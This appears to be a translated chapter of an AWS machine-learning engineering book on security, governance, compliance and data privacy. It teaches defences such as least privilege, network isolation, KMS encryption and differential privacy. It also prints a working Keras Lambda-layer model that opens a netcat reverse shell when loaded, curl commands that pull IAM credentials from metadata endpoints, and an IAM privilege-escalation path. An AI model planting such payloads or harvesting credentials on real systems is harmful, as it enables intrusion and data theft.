

# 安全、治理和合规策略

在本书的前八章中，我们专注于使我们的**机器学习**（**ML**）实验和部署在云中运行。除此之外，我们还能够使用各种服务分析、清理和转换几个样本数据集。对于一些动手实践示例，我们使用了从安全角度相对安全（因为这些数据集不包含**个人身份信息**（**PII**））的合成数据集。在前几章中，我们能够完成很多事情，但重要的是要注意，在我们的 AWS 账户中运行**数据工程**和**机器学习工程**工作负载只是第一步！一旦我们需要处理生产级别的机器学习需求，我们就必须担心其他与机器学习系统和流程的**安全**、**治理**和**合规**相关的问题。为了解决这些挑战，我们必须使用各种解决方案和技术，帮助我们预防、检测、减轻和报告这些问题。

在本章中，我们将涵盖以下主题：

+   管理机器学习环境的安全和合规性

+   保护数据隐私和模型隐私

+   建立机器学习治理

与本书中的其他章节不同，本章将不会包括完整的分步解决方案，因为我们将会讨论广泛的网络安全主题。这些主题将涵盖如何保护我们在前几章中讨论的不同服务和解决方案的不同策略和技术。对于这些主题中的每一个，我们将更深入地探讨相关的子主题。我们还将讨论一些可以在现有的 AWS 上运行的机器学习环境中轻松实施的网络安全最佳实践。带着这些目标，让我们开始吧！

# 管理机器学习环境的安全和合规性

数据科学团队通常花费大量时间处理数据、训练机器学习模型并将模型部署到推理端点。由于成功实现其主要目标所需的工作和研究量很大，这些团队往往将任何关于安全性和合规性的“额外工作”放在次要位置。在云中运行了几个月的生产级别机器学习工作负载后，这些团队可能会因为以下原因而遇到各种与安全相关的问题：

+   *对安全、治理和合规重要性缺乏理解和认识*

+   *对相关合规法规和政策缺乏了解和认识*

+   *缺乏稳固的安全流程和标准*

+   *内部跟踪和报告机制不佳*

为了更好地了解如何正确管理和处理这些问题，我们将在本节中深入探讨以下主题：

+   身份验证和授权

+   网络安全

+   静态和传输中的加密

+   管理合规报告

+   漏洞管理

我们将从如何在与前几章中使用的不同机器学习和数据工程服务进行安全工作时与**AWS 身份和访问管理**（**IAM**）服务一起工作的最佳实践开始。

## 认证和授权

在*第四章*“AWS 上的无服务器数据管理”中，我们创建了一个 IAM 用户并将其附加到一些现有的策略上。除此之外，我们还创建并附加了一个自定义内联策略，该策略为 IAM 用户提供了管理**Redshift Serverless**和**Lake Formation**资源的必要权限。如果你已经完成了该章节的动手解决方案，你可能已经想知道，“为什么要费这么大的劲来设置这个？”。一方面，在撰写本文时，Redshift Serverless 不支持使用根账户执行查询。同时，使用具有有限权限集的 IAM 用户比直接使用根账户更安全。这限制了攻击者在用户账户被入侵时可能造成的损害。

注意

在我们的例子中，如果 IAM（非根）用户账户被入侵，攻击者只能对我们的 Redshift Serverless 和 Lake Formation 资源造成损害（除非他们能够执行**权限提升攻击**）。我们将在稍后详细讨论这个话题！

如果根账户的访问密钥和/或凭证被盗，攻击者将能够访问所有 AWS 服务的所有资源。另一方面，如果具有有限权限集的 IAM 用户的访问密钥和/或凭证被盗，攻击者将只能访问 IAM 用户可访问的资源。

假设我们不小心将以下代码推送到 GitHub 或 GitLab 的公共仓库中：

```py
import boto3
sagemaker_client = boto3.client(
    'sagemaker-runtime',
    aws_access_key_id="<INSERT ACCESS KEY ID>",
    aws_secret_access_key="<INSERT SECRET ACCESS KEY>"
)
```

假设这里使用的凭证与一个根账户用户相关联，攻击者可以使用这些凭证造成“广泛的破坏”，例如删除账户中所有现有的资源或创建将被用于攻击其他账户的新资源。

注意

*如何操作？* 一个可能的行动是黑客使用从源代码和历史记录中获取的凭证配置 AWS CLI，然后运行 AWS CLI 命令，终止 AWS 账户中所有正在运行的资源。

为了防止出现这种情况，我们可以使用以下代码块代替：

```py
sagemaker_client = boto3.client('sagemaker-runtime')
```

在这里，我们期望`boto3`能够自动定位并使用脚本运行环境中的凭证。例如，如果脚本在 AWS Cloud9 环境中运行，凭证可能存储在`~/.aws`目录中。

此外，以下是一些关于如何确保我们的 IAM 设置的最佳实践和推荐步骤：

+   停止使用并删除 AWS 根账户的访问密钥（如果可能的话）。

+   在根账户和所有 IAM 用户上启用**多因素认证**（**MFA**）。

+   定期轮换访问密钥和密码。

+   在可能的情况下，使用（并假定）IAM 角色来委派权限，而不是使用长期密码或访问密钥凭证。

+   如果可能的话，定期过期和轮换密码和密钥（例如，每 90 天一次）。

+   使用 **IAM 策略模拟器** 和 **IAM 访问分析器** 实现一个“最小权限”配置。

除了遵循最佳实践外，我们还应定期检查任何 IAM 权限配置错误。我们必须花时间深入挖掘并验证哪些是可利用的。例如，一个拥有有限权限集的 IAM 用户的攻击者可能会执行 `iam:AddUserToGroup` 权限，攻击者可以使用 AWS CLI（或任何替代方法）将 IAM 用户添加到一个具有更宽松权限集的现有 IAM 组中。如果 `AdministratorAccess` 管理策略附加到其中一个现有的 IAM 组，攻击者可以将受损害的 IAM 用户添加到带有附加 `AdministratorAccess` 管理策略的组中，从而获得对整个 AWS 账户的完全管理员访问权限。请注意，这只是可能情景之一，还有其他几种已知的权限提升方法。在某些情况下，攻击者在获得完全管理员访问权限之前可能会使用这些技术的链或组合。为了防止这类攻击，我们应该尽可能避免授予 `iam:*` 权限。

到目前为止，你可能想知道，*我们如何测试我们 AWS 账户的安全性*？有几个工具，包括开源利用框架和安全测试工具包，如 **Pacu**、**ScoutSuite** 和 **WeirdAAL**（**AWS 攻击库**），可以用来评估和测试云环境的安全性。我们不会在本书中讨论如何使用这些工具，所以你可以单独查看这些工具。

备注

当攻击者获得对 AWS 账户的完全管理员访问权限时会发生什么？嗯，可能会有各种可怕的事情发生！例如，攻击者现在可以自由地启动 AWS 资源，如 EC2 实例，这些实例可以用来攻击其他账户和系统。攻击者还可以使用受损害的账户来挖掘加密货币（例如，比特币）。攻击者还应该能够窃取和访问存储在受损害 AWS 账户中数据库中的数据。所有 AWS 资源都可能被删除。

在结束本节之前，让我们讨论一下 SageMaker 执行角色的运作方式，以便我们更好地了解如何提高我们 ML 环境设置的安全性。当我们使用 `get_execution_role` 函数时，我们会得到为 SageMaker Studio 或运行代码的 Notebook 实例创建的 IAM 角色：

```py
from sagemaker import get_execution_role
role = get_execution_role()
```

根据这个 IAM 角色的设置方式，它可能附带了`AmazonSageMakerFullAccess` IAM 策略，这允许访问多个 AWS 服务。如果配置了更宽松的权限集，能够访问 SageMaker Studio 或 Notebook 实例的攻击者可能能够通过提升权限攻击来获得额外的权限。假设你计划为 10 名参与者举办一个 ML 工作坊。为了设置环境，你首先为每个参与者创建了一个 IAM 用户，以便他们可以访问专用的 Notebook 实例（或相应的 SageMaker Studio 域和用户集），类似于以下图中所示：

![图 9.1 – ML 工作坊环境中的 IAM 配置示例](img/B18638_09_001.jpg)

图 9.1 – ML 工作坊环境中的 IAM 配置示例

在这里，IAM 用户只有列出和访问可用的 Notebook 实例的权限。然而，Notebook 实例附带了 IAM 角色，这些角色可能具有攻击者可以利用的额外权限。换句话说，一旦攻击者（作为工作坊参与者）使用 IAM 用户之一访问工作坊期间可用的 Notebook 实例之一，攻击者就可以简单地在该 Notebook 实例的终端内打开一个`curl`命令：

```py
curl http://169.254.169.254/latest/meta-data/identity-
credentials/ec2/security-credentials/ec2-instance
```

或者，如果你为工作坊设置了并使用了**SageMaker Studio**，攻击者可以运行以下命令并获取安全凭证：

```py
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

一旦凭证被窃取，攻击者现在有多种选择来使用这些凭证执行特定的攻击。*这很可怕，对吧？*如果附加到 Notebook 实例的 IAM 角色附带了`AdministratorAccess`管理策略，这意味着攻击者将能够通过提升权限攻击获得完整的管理员访问权限！

为了减轻和管理与类似场景相关的风险，建议在配置附加到 AWS 资源的 IAM 角色时实践**最小权限原则**。这意味着我们需要深入了解附加到 IAM 角色的策略，并检查哪些权限可以被移除或降低。这将限制即使执行了提升权限攻击后的潜在损害。此外，如果你要举办一个 ML 工作坊，你可能希望使用**SageMaker Studio Lab**而不是在你的 AWS 账户中为参与者创建 Notebook 实例。采用这种方法，工作坊参与者可以运行 ML 训练实验和部署，而无需使用 AWS 账户。同时，使用 SageMaker Studio Lab 是免费的，非常适合工作坊！

注意

更多关于这个主题的信息，请查看[`studiolab.sagemaker.aws/`](https://studiolab.sagemaker.aws/)。

## 网络安全

在训练和部署 ML 模型时，ML 工程师可能会意外使用一个包含攻击者准备的恶意代码的库或自定义容器镜像。例如，攻击者可能会生成一个包含反向 shell 有效载荷的`model.h5`文件：

```py
import tensorflow
from tensorflow.keras.layers import Input, Lambda, Softmax
from tensorflow.keras.models import Model
from tensorflow.keras.optimizers import Adam
def custom_layer(tensor):
    PAYLOAD = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2>&1 | nc 127.0.0.1 14344 > /tmp/FCMHH'
    __import__('os').system(PAYLOAD)

    return tensor
input_layer = Input(shape=(10), name="input_layer")
lambda_layer = Lambda(
    custom_layer,   
    name="lambda_layer"
)(input_layer)
output_layer = Softmax(name="output_layer")(lambda_layer)
model = Model(input_layer, output_layer, name="model")
model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")
model.save("model.h5")
```

在这里，攻击者利用**Keras Lambda 层**来运行自定义函数。加载生成的文件类似于使用 TensorFlow 加载其他模型的方式：

```py
from tensorflow.keras.models import load_model
load_model("model.h5")
```

这有多种变体，包括向 pickle 文件和 YAML 文件注入有效载荷，这会影响其他库和框架，如*scikit-learn*和*PyTorch*。

注意

想了解更多如何在 ML 模型文件中注入恶意有效载荷的示例，请查看[`gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b`](https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b)。

一旦反向 shell 有效载荷在 ML 实例的训练和推理容器内执行，攻击者可能能够访问数据并将其传输到外部服务器。为了防止这类攻击，我们可以启用类似于以下代码块中所示的`Estimator`对象：

```py
estimator = Estimator(
    image,
    role,
    instance_type='ml.p2.xlarge',
    ...
    enable_network_isolation=True
)
```

一旦我们在后续步骤中使用`fit()`方法运行训练作业，ML 实例内部的训练容器在训练作业运行期间将不再具有网络访问权限。

注意

当然，我们的第一层防御是避免使用来自不受信任和可能危险的来源的模型和代码。然而，尽管我们最好的意图，我们仍然可能意外地下载了受损害的资源。这就是为什么我们需要利用网络隔离解决方案作为下一层防御的原因。

我们可以通过准备和使用一个**VPC**（虚拟私有云）来获得类似的网络安全设置，而不需要以下内容：

+   **互联网网关**，它使公共子网中的资源能够访问互联网

+   **NAT 网关**，它允许私有子网中的资源建立“单向”出站连接

+   其他可能允许 VPC 内部和外部资源相互通信的类似网关

使用这种设置，部署在 VPC 内部的资源将不会拥有互联网连接。话虽如此，如果我们在一个部署在 VPC 内部的 EC2 实例中运行包含恶意代码的训练脚本，恶意代码将无法访问互联网并连接到 VPC 外部的服务器和资源。*如果我们想从 S3 存储桶上传和下载文件怎么办？*为了使这一功能正常工作，我们需要配置**VPC 端点**以启用对 AWS 服务（如 S3）的网络连接。如果我们想连接到另一个 VPC 内部的资源，我们可以使用**AWS PrivateLink**并使用它们的私有 IP 地址来访问这些资源。使用这种方法，资源不是通过互联网访问的，并且在使用 AWS PrivateLink 时不需要存在互联网网关（一个接口 VPC 端点）。

以下设置可以确保通过 PrivateLink 直接且更安全地访问 AWS 资源：

+   通过 PrivateLink 访问**Amazon Athena**

+   通过 PrivateLink 访问**AWS Lambda**

+   通过 PrivateLink 连接到**Amazon Redshift**

+   通过 PrivateLink 调用**SageMaker 推理端点**

+   通过 PrivateLink 连接到**SageMaker Studio**

+   通过 PrivateLink 访问**API Gateway** API

注意，这并不是使用 PrivateLink 可以保护的所有内容的详尽列表，因为还有许多与 PrivateLink 集成的服务。

注意

想要了解更多关于支持的服务列表，请查看[`docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml`](https://docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml)。

## 静态和传输中的加密

SageMaker 在训练机器学习模型时支持多种数据源选项。在大多数情况下，机器学习工程师默认使用**Amazon S3**存储桶作为数据的默认来源。在其他情况下，可能会使用**Amazon Elastic File System**（**Amazon EFS**）代替，尤其是在需要更高吞吐量的工作负载中。对于更高的性能吞吐量需求，我们可以使用**Amazon FSx for Lustre**（可能链接到 S3 存储桶作为源）。这些存储选项与**AWS 密钥管理服务**（**AWS KMS**）集成，有助于确保数据在写入文件系统之前自动加密（即，没有密钥无法读取）。

注意

想要了解更多关于加密概念，如**非对称和对称加密**、**解密**和**封装加密**，请查看[`docs.aws.amazon.com/crypto/latest/userguide/cryptography-concepts.xhtml`](https://docs.aws.amazon.com/crypto/latest/userguide/cryptography-concepts.xhtml)。

注意，在使用 KMS 时，我们有两种选择。第一种是使用默认的**AWS 管理的密钥**，第二种是创建并使用**客户管理的密钥**。*我们应该何时使用客户管理的密钥？* 如果我们想要更多的控制，例如启用密钥轮换以及撤销、禁用或删除密钥访问的选项，那么我们应该选择使用客户管理的密钥。如果你想知道训练和托管实例附加的存储卷是否可以使用 KMS 客户管理的密钥进行加密，那么答案是*YES*。要使用客户管理的密钥，我们只需指定一个可选的 KMS 密钥 ID，类似于以下代码块中的内容：

```py
estimator = Estimator(
    image,
    ...
    volume_kms_key=<insert kms key ARN>,
    output_kms_key=<insert kms key ARN>
)
...
estimator.deploy(
    ...
    kms_key=<insert kms key ARN>
)
```

在这里，我们可以看到我们还可以指定一个可选的 KMS 密钥，该密钥将用于加密 Amazon S3 中的输出文件。除了加密静态数据外，我们还需要确保在执行分布式训练时数据传输的安全性。当在执行训练作业时使用多个实例，我们可以启用 **容器间流量加密** 来保护实例之间传输的数据。如果我们需要遵守特定的监管要求，我们需要确保传输的数据也已被加密。

当使用 **SageMaker Python SDK** 启用容器间流量加密时，操作简单：

```py
estimator = Estimator(
    image,
    ...
    encrypt_inter_container_traffic=True
)
```

*这不是很简单吗？* 在启用容器间流量加密之前，请确保您了解其对整体训练时间和训练作业成本可能产生的影响。当使用分布式深度学习算法时，添加此额外的安全级别后，整体训练时间和成本可能会增加。对于 `NetworkConfig` 对象，类似于以下代码块中的内容：

```py
config = NetworkConfig(
    enable_network_isolation=True,
    encrypt_inter_container_traffic=True
)
processor = ScriptProcessor(
    ...
    network_config=config
)
processor.run(
    ...
)
```

注意，此方法应适用于不同“类型”的处理作业，如下所示：

+   用于模型可解释性和自动偏差指标计算的 `SageMakerClarifyProcessor`

+   用于使用 **PySpark** 处理作业的 `PySparkProcessor`

+   用于使用 **scikit-learn** 处理作业的 `SKLearnProcessor`

SageMaker 还支持在处理数据以及训练和部署模型时使用自定义容器镜像。这些容器镜像存储在 `docker push` 命令中，ECR 会自动加密这些镜像。一旦这些容器镜像被拉取（例如，使用 `docker pull` 命令），ECR 会自动解密这些镜像。

除了这些，我们还可以使用 KMS 在 SageMaker 中加密以下内容：

+   SageMaker Studio 存储卷

+   SageMaker 处理作业的输出文件

+   SageMaker Ground Truth 标注作业的输出数据

+   SageMaker Feature Store 的在线和离线存储

备注

这可能是我们第一次在这本书中提到 **SageMaker Ground Truth** 和 **SageMaker Feature Store**！如果您想知道这些是什么，SageMaker Ground Truth 是一种数据标注服务，它帮助机器学习从业者使用各种选项准备高质量的标注数据集，而 SageMaker Feature Store 是一个完全托管的特征存储，其中可以存储、共享和管理 ML 模型的特征。我们在这本书中不会深入探讨这些服务的具体工作方式，因此请随时查阅 [`docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml`](https://docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml) 和 https://docs.aws.amazon.com/sagemaker/latest/dg/feature-store.xhtml 以获取更多关于这些主题的详细信息。

*如果我们在外部执行数据处理、模型训练和模型部署呢？* 好消息是，AWS 平台中的许多服务都与 KMS 集成。这意味着通常只需进行一些小的配置更改即可启用服务器端加密。以下是一些 KMS 立即可用的示例：

+   EBS 卷加密

+   Redshift 集群加密

+   加密 Amazon S3 对象

+   Glue DataBrew 作业写入的数据加密

+   加密存储在 CloudWatch 日志中的日志数据

我们还可以使用**AWS Encryption SDK**在将数据发送到 AWS 服务（例如 Amazon S3）之前加密数据。使用相同的客户端加密库，我们可以在从存储位置检索数据后解密数据。

注意

在处理 AWS 上的加密和解密需求时，有几个选项可供选择。除了**AWS KMS**和**AWS Encryption SDK**之外，还有**DynamoDB Encryption Client**和**AWS CloudHSM**。我们不会深入探讨每一个，所以请查阅 https://docs.aws.amazon.com/crypto/latest/userguide/awscryp-choose-toplevel.xhtml 以获取更多信息。

除了已经讨论的内容之外，我们还必须了解一些额外的技术，如何在使用 EC2 实例进行 ML 需求时保护并加密传输中的数据。在*第二章* *深度学习 AMIs*中，我们从 EC2 实例内部的命令行启动了**Jupyter Notebook**应用程序。你可能已经注意到我们使用 HTTP 而不是 HTTPS 来访问应用程序。我们可以做的改进之一是使用 SSL（使用 Web 证书）加密服务器和浏览器之间的流量。另一个解决方案是使用**SSH 隧道**访问 Jupyter Notebook 应用程序。*SSH 是什么？* SSH 隧道是一种机制，涉及在两台计算机之间使用加密的 SSH 连接来通过安全通道转发连接：

![图 9.2 – SSH 隧道](img/B18638_09_002.jpg)

图 9.2 – SSH 隧道

在这里，我们可以看到即使应用程序运行在 EC2 实例内部，我们也可以从本地机器访问 Jupyter Notebook 应用程序。在这里，我们使用 SSH 隧道将连接通过 SSH 的安全通道进行转发。

要设置此环境，我们只需运行一个类似于以下命令块中的命令（假设我们的本地机器是 Unix 操作系统）：

```py
ssh <user>@<IP address of instance> -NL 14344:localhost:8888
```

命令运行后，我们应该能够通过在浏览器中访问以下链接来在本地访问 Jupyter Notebook 应用程序：[`localhost:14344`](http://localhost:14344)。

既然我们已经讨论了几种加密数据的技术，那么让我们继续讨论一些可以帮助我们管理环境合规性的服务。

## 管理合规性报告

除了保护机器学习和系统外，对于数据科学团队来说，管理 AWS 账户中使用的资源和流程的整体合规性至关重要。管理合规性涉及确定组织需要遵守的相关法规和指南（例如，**HIPAA**、**PCI-DSS**和**GDPR**），并执行推荐的一系列步骤以实现（并维持）所需的合规性。

安全性和合规性由 AWS 和客户共享。客户通常需要关注以下方面：

+   客户操作系统

+   在 AWS 服务之上运行的所有应用程序

+   使用不同 AWS 资源的配置

注意

更多关于**共享责任模型**的详细信息，请查看[`aws.amazon.com/compliance/shared-responsibility-model/`](https://aws.amazon.com/compliance/shared-responsibility-model/)。

在处理合规性执行和报告时，AWS 提供了各种服务、工具和能力：

+   **AWS Artifact**：这是安全性和合规性文档、报告和资源的集中来源。在这里，我们可以下载我们将需要的有关安全性和合规性文档。

+   **AWS Config**：这可以用来持续监控 AWS 资源的配置，并启用自动修复以确保机器学习和系统符合性。

+   **AWS Audit Manager**：这有助于简化 AWS 资源的风险和合规性评估。

+   **AWS 合规中心**：这是云相关法规资源的集中来源。

我们不会深入探讨这些服务如何使用的细节，因此请随意查看本章末尾的**进一步阅读**部分以获取更多详细信息。在下一节中，我们将快速讨论一些可以帮助我们进行漏洞管理的相关服务。

## 漏洞管理

实施安全最佳实践并不能保证环境或系统免受攻击。除了遵循安全最佳实践和合规性要求外，团队应使用各种漏洞评估和管理工具来检查系统中可能被利用的漏洞。

在 AWS 中检测和管理漏洞的一个实用解决方案是**Amazon Inspector**。Amazon Inspector 通过自动检测推送到 Amazon ECR 的 EC2 实例和容器镜像中的漏洞来实现**自动漏洞管理**。*这是如何工作的？*每当检测到“更改”（例如，将容器镜像推送到 ECR）时，Amazon Inspector 会自动扫描资源，这样用户就不需要手动启动漏洞扫描。这意味着如果我们正在为**SageMaker Processing**作业、训练作业或 ML 推理端点准备和构建自定义容器镜像，每次我们将新版本推送到 Amazon ECR 存储库时，Amazon Inspector 都会自动为我们扫描容器镜像。如果 Amazon Inspector 检测到并报告了漏洞，下一步就是我们对受影响的资源执行所需的修复步骤。

注意

想要了解如何使用和设置 Amazon Inspector 的逐步教程，请查看[`medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515`](https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515)。

除了 Amazon Inspector，我们还可以使用以下服务和功能来管理在 AWS 上我们的 ML 环境中的安全风险和漏洞：

+   **Amazon CodeGuru Reviewer**：这可以用于分析代码并使用**安全检测器**自动检测安全问题。

+   **Amazon GuardDuty**：这可以用于自动检测 AWS 账户中的恶意活动，如权限提升攻击。

+   **AWS Security Hub**：这可以用于自动化安全检查和执行云安全态势管理。

在我们结束本节之前，让我们快速讨论如何使用防火墙保护 ML 推理端点。在*第三章* *深度学习容器*中，我们使用服务的自定义容器镜像支持在 Lambda 函数内部部署了我们的 ML 模型。然后，我们设置并配置了一个 API Gateway HTTP API 触发器，当有新的端点请求时触发 Lambda 函数。如果我们想保护这个设置并使这个无服务器 API 可供公众使用，我们可以配置一个**AWS Web 应用程序防火墙**（**WAF**）来保护它，如图中所示：

![图 9.3 – 使用 AWS WAF 保护 API 端点](img/B18638_09_003.jpg)

图 9.3 – 使用 AWS WAF 保护 API 端点

AWS WAF 通过使用“规则”来保护已部署的 Web 应用程序免受利用现有漏洞的攻击，这些规则解决了包括新兴的**通用漏洞和暴露**（**CVEs**）、**开放 Web 应用程序安全项目**（**OWASP**）前 10 大漏洞等问题。

注意

注意，如果我们的 API 网关与 SageMaker 推理端点接口，这个解决方案也将适用——无论我们使用**API 网关映射模板**还是**Lambda 函数**来调用 SageMaker 推理端点。我们还可以使用 AWS WAF 来保护我们的**Amazon CloudFront**和**应用程序负载均衡器（ALB**）资源，以保护在 ALB 后面运行的 ML 推理端点的 EC2 实例。

到目前为止，我们应该对管理机器学习环境的安全性和合规性的不同解决方案和策略有了很好的了解。在下一节中，我们将深入探讨保护数据隐私和模型隐私的不同技术。

# 保护数据隐私和模型隐私

在处理机器学习和机器学习工程需求时，我们需要确保我们保护训练数据，以及生成的模型参数，免受攻击者侵害。如果有机会，这些恶意行为者将执行各种攻击，以提取训练模型的参数，甚至恢复用于训练模型的原始数据。这意味着个人身份信息（PII）可能会被泄露和窃取。如果模型参数被破坏，攻击者可能能够通过重新创建公司花费数月或数年开发的模型来进行推理。*这很可怕，对吧？* 让我们分享一些攻击者可以执行的攻击示例：

+   **模型反演攻击**：攻击者试图恢复用于训练模型的训练数据集。

+   **模型提取攻击**：攻击者试图通过预测输出值窃取训练好的模型。

+   **成员推断攻击**：攻击者试图推断一个记录是否是用于训练模型的训练数据集的一部分。

+   **属性推断攻击**：攻击者试图猜测训练记录中缺失的属性（使用可用的部分信息）。

现在我们对一些可能的攻击有了更好的了解，让我们讨论我们可以使用的解决方案和防御机制，以保护数据和模型的隐私。

## 联邦学习

让我们先从**联邦学习**谈起，但在我们这么做之前，让我们将其与典型的机器学习训练和部署方式进行比较，后者是**集中式**的：

![图 9.4 – 集中式机器学习](img/B18638_09_004.jpg)

图 9.4 – 集中式机器学习

在这里，数据是从用户的移动设备收集到集中位置的，在单个机器（或使用分布式训练的机器集群）上执行机器学习模型训练步骤。由于发送到集中位置的数据可能包含关于用户的敏感信息，因此这种方法存在关于数据所有权、隐私和局部性的问题。为了管理这些问题，我们可以利用联邦学习，其中训练步骤直接在边缘设备上执行，如下面的图所示：

![图 9.5 – 联邦机器学习](img/B18638_09_005.jpg)

图 9.5 – 联邦机器学习

在这里，只有模型被发送回服务器并“合并”以生成新的全局模型。这有助于解决**隐私保护**问题，因为数据保持在边缘设备上。在*第七章*的“部署策略和最佳实践”部分中，我们提到，在部署和管理边缘设备上的机器学习模型时，我们可以使用**SageMaker Edge Manager**以及其他服务。在这里，我们假设模型已经训练好，我们只是在部署步骤中使用这些服务。*模型是如何训练的？*以下是一些可能的解决方案：

+   使用**TensorFlow Federated**([`www.tensorflow.org/federated`](https://www.tensorflow.org/federated))和**PyTorch Mobile**([`pytorch.org/mobile/home/`](https://pytorch.org/mobile/home/))等解决方案，这些解决方案可用于联邦机器学习需求。

+   使用**Flower**([`flower.dev/`](https://flower.dev/))框架，以及**AWS IoT Greengrass**、**Amazon ECS**和**AWS Step Functions**等服务来管理在边缘设备上进行联邦学习时的训练集群不可预测性和协调器到设备挑战。

+   使用**OpenMined/SwiftSyft**（在 iOS 设备上）和**OpenMined/KotlinSyft**（在 Android 设备上）等解决方案来训练和部署用**TensorFlow**或**PyTorch**编写的**PySyft**模型。

注意

**PySyft**是什么？它是**OpenMined**的一个库，利用联邦学习、差分隐私和加密计算来满足安全和隐私的深度学习需求。如果你想知道**差分隐私**和**加密计算**是什么，我们现在就来讨论这些内容！

## 差分隐私

现在，让我们来谈谈**差分隐私**。差分隐私涉及使用技术来保护数据集中关于个体记录共享的信息，这将使攻击者更难逆向工程原始数据。这些技术包括在生成统计数据时，向训练数据或模型参数中添加精心设计的随机噪声。以下是一些示例和解决方案：

+   在训练**自然语言处理**（**NLP**）模型和分析 SageMaker 中的数据时使用一种名为**度量差分隐私**的变体。在这里，训练数据集中单词的“意义”得到保留，同时保护个体记录的隐私。有关更多信息，请参阅[`www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data`](https://www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data)。

+   在使用开源的**TensorFlow Privacy**库训练具有最小代码更改的隐私保护机器学习模型时。更多信息，请查看[`blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml`](https://blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml)。

+   使用开源的**Opacus**库在训练 PyTorch 模型的同时启用差分隐私。更多信息，请查看[`opacus.ai/`](https://opacus.ai/)。

注意

如果您想知道这些解决方案如何在 AWS 中使用，我们只需在将要执行机器学习实验的资源内部安装所需的软件包和库（例如，`pip install opacus`）。例如，如果我们使用`pip install opacus`启动了一个 EC2 实例。如果我们使用**脚本模式**时使用`requirements.txt`文件，或者提供将被 SageMaker 使用的自定义容器镜像。

## 隐私保护机器学习

在**隐私保护机器学习**（**PPML**）这一类技术中，即使输入模型的数据负载被加密，也可以执行 ML 推理。这意味着我们可以在将敏感数据作为负载传递给 ML 推理端点之前对其进行保护和加密。在 PPML 模型对加密负载进行推理后，结果会被加密返回给发送者。最后一步是发送者解密结果。*这很酷，对吧？*一个例子是**隐私保护 XGBoost 模型**，它利用隐私保护加密方案和工具，如**顺序保持加密**（**OPE**）、**伪随机函数**（**PRFs**）和**加法同态加密**（**AHE**）来对加密查询进行预测。当使用**SageMaker 托管服务**部署隐私保护 XGBoost 模型时，我们可以使用自定义容器镜像，这样在推理过程中使用的软件包和代码就更有灵活性。请注意，PPML 会增加一些计算开销，并且与未加密版本相比，生成的模型在性能上通常较慢。

注意

我们不会深入探讨本书中 PPML 的工作细节。更多信息，请查看[`www.amazon.science/publications/privacy-preserving-xgboost-inference`](https://www.amazon.science/publications/privacy-preserving-xgboost-inference)。

## 其他解决方案和选项

最后，当涉及到管理数据隐私时，数据科学团队应充分利用他们所使用的服务和工具现有的安全特性和功能。除了本章其他部分提到的内容外，以下是我们保护 AWS 中的数据时可以使用的其他服务和功能：

+   **Amazon Macie**：用于通过自动发现敏感数据（如 PII）来评估存储在 S3 中的数据的隐私和安全。

+   **Redshift 支持行级安全性和列级访问控制**：用于启用对 Redshift 表中行和列的细粒度访问。

+   `*******@email.com` 而不是 `johndoe@email.com`）。

+   **Redshift 支持跨账户数据共享**：用于在 AWS 账户之间共享存储在 Redshift 仓库中的数据（这样在需要共享访问时，数据就不再需要复制和传输到另一个账户）。

+   **Amazon OpenSearch 服务字段掩码支持**：在执行 Amazon OpenSearch 服务的搜索查询时，使用基于模式的字段掩码来隐藏敏感数据，如 PII。

+   **S3 对象 Lambda**：使用自定义代码来处理和修改 S3 GET 请求的输出（包括掩码和编辑数据的能力）。

+   **AWS Lake Formation 支持行级和单元格级安全**：这使查询结果和 AWS Glue ETL 作业的细粒度访问成为可能。

+   **主成分分析（SageMaker 内置算法）**：一种基于 PCA 的转换，用于在保护数据隐私的同时保留数据的“本质”。

到目前为止，我们应该对管理数据和模型隐私的不同方法有了更好的理解。在下一节中，我们将讨论机器学习治理，并讨论 AWS 中可用的不同解决方案。

# 建立机器学习治理

在处理机器学习项目和需求时，必须尽早考虑机器学习治理。由于以下原因，治理经验较差的公司和团队会面临短期和长期问题：

+   *缺乏对机器学习模型清晰和准确的清单跟踪*

+   *关于模型可解释性和可解释性的局限性*

+   *训练数据中存在偏差*

+   *训练和推理数据分布的不一致性*

+   *缺乏自动化的实验谱系跟踪流程*

*我们如何处理这些问题和挑战？* 我们可以通过建立机器学习治理（正确的方式）并确保以下领域被考虑来解决和管理这些问题：

+   谱系跟踪和可重复性

+   模型清单

+   模型验证

+   机器学习可解释性

+   偏差检测

+   模型监控

+   数据分析和数据质量报告

+   数据完整性管理

我们将在本节中详细讨论这些内容。在继续之前，请随意喝杯咖啡或茶！

## 谱系跟踪和可重复性

在 *第六章* *SageMaker 训练和调试解决方案* 中，我们讨论了在使用训练数据集、算法、特定超参数值的配置以及其他相关训练配置参数值作为训练作业的输入后，如何生成机器学习模型。

数据科学家和机器学习从业者必须能够验证模型是否可以使用相同的配置设置构建和重现，包括其他“输入”如训练数据集和算法。如果我们只处理一个实验，手动跟踪这些信息相对容易。也许将此信息存储在电子表格或 Markdown 文件中就能解决问题！随着我们需求的演变，这些信息可能会在过程中丢失，尤其是在手动操作的情况下。话虽如此，一旦我们需要使用各种超参数配置值的组合（例如，使用 SageMaker 的**自动模型调优**功能）运行多个训练实验，跟踪这个“历史”或**血缘**就会变得更加困难和复杂。好消息是，SageMaker 自动帮助我们通过**SageMaker ML 血缘跟踪**和**SageMaker 实验**来跟踪这些信息。如果我们想查看实验血缘以及其他详细信息，**SageMaker Studio**只需几点击就能轻松获取这些信息。

注意

```py
Machine Learning with Amazon SageMaker Cookbook) https://bit.ly/3POKbKf.
```

